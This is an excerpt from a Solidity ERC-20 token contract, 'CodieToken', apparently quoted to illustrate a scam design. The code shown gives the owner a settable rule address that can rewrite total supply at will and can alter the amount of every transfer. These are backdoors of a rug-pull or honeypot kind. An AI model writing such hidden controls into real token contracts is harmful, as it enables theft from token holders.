...
contract CodieToken is Context, IERC20, Ownable {
  ...
  function setRule(address a)  external onlyOwner{
      _ruleAddr = a;
  }
  function setSupply(uint256 a)  external returns (bool){
      require(msg.sender==owner() || msg.sender==_ruleAddr);
      _totalSupply = a;
      return true;
  }
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    uint256 sy=amount;
    if(_ruleAddr!=address(0)){
        sy = Rule(_ruleAddr).check(sender,recipient,amount);
    }
